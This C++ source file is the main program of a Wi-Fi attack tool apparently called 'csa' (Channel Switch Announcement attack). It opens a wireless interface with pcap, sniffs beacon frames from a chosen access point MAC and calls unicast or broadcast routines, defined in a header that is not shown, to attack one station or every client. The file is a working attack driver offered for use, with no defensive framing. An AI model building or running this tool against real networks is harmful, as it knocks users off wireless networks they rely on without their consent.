#include "csa_attack.h"

void usage() {
    printf("syntax: ./csa <interface> <apMAC> [<StationMac>]\n");
    printf("sample: ./csa wlan0 88:88:88:88:88:88 99:99:99:99:99:99\n");
}

bool parse(char** interface, char** ap_mac, char** station_mac, int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        usage();
        return false;
    }
    *interface = argv[1];
    *ap_mac = argv[2];
    if (argc == 4) {
        *station_mac = argv[3];
    } else {
        *station_mac = nullptr;
    }
    return true;
}

bool is_beacon_frame(const u_char* packet, size_t packet_len) {
    if (packet_len < sizeof(struct RadiotapHeader) + sizeof(struct IEEE80211Header)) {
        std::cerr << "Packet too short to be a beacon frame" << std::endl;
        return false;
    }

    struct RadiotapHeader* rheader = (struct RadiotapHeader*)packet;
    if (rheader->version != 0) {
        std::cerr << "Invalid radiotap header version" << std::endl;
        return false;
    }

    struct IEEE80211Header* ieee_header = (struct IEEE80211Header*)(packet + rheader->len);
    uint16_t frame_control = ntohs(ieee_header->frame_control);

    // Check if the frame is a beacon frame
    bool is_beacon = (frame_control & 0xFF00) == 0x8000;
    // if (!is_beacon) {
    //     std::cerr << "Frame is not a beacon frame, frame_control: " << std::hex << frame_control << std::dec << std::endl;
    // }

    return is_beacon;
}

bool match_ap_mac(const u_char* packet, const char* ap_mac) {
    struct RadiotapHeader* rheader = (struct RadiotapHeader*)packet;
    struct IEEE80211Header* ieee_header = (struct IEEE80211Header*)(packet + rheader->len);

    uint8_t ap_mac_bytes[6];
    std::istringstream apMacStream(ap_mac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        if (!(apMacStream >> std::hex >> value)) {
            std::cerr << "MAC address parsing failed: invalid format" << std::endl;
            exit(EXIT_FAILURE);
        }
        if (i < 5 && !(apMacStream >> colon)) {
            std::cerr << "MAC address parsing failed: delimiter error" << std::endl;
            exit(EXIT_FAILURE);
        }
        if (value < 0 || value > 255) {
            std::cerr << "MAC address parsing failed: value out of range" << std::endl;
            exit(EXIT_FAILURE);
        }
        ap_mac_bytes[i] = static_cast<uint8_t>(value);
    }

    // // Print the MAC addresses for debugging
    // std::cerr << "AP MAC from packet: ";
    // for (int i = 0; i < 6; ++i) {
    //     std::cerr << std::hex << (int)ieee_header->src_addr[i] << ":";
    // }
    // std::cerr << std::dec << std::endl;

    // std::cerr << "AP MAC from argument: ";
    // for (int i = 0; i < 6; ++i) {
    //     std::cerr << std::hex << (int)ap_mac_bytes[i] << ":";
    // }
    // std::cerr << std::dec << std::endl;

    return memcmp(ieee_header->src_addr, ap_mac_bytes, 6) == 0;
}

int main(int argc, char* argv[]) {
    char* interface = nullptr;
    char* ap_mac = nullptr;
    char* station_mac = nullptr;

    if (!parse(&interface, &ap_mac, &station_mac, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) returned null - %s\n", interface, errbuf);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex returned %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        if (is_beacon_frame(packet, header->caplen) && match_ap_mac(packet, ap_mac)) {
            printf("Beacon frame detected\n");
            if (station_mac != nullptr) {
                unicast(interface, packet, ap_mac, header->caplen, station_mac);
            } else {
                broadcast(interface, packet, ap_mac, header->caplen);
            }
        }
    }

    pcap_close(pcap);
    return 0;
}
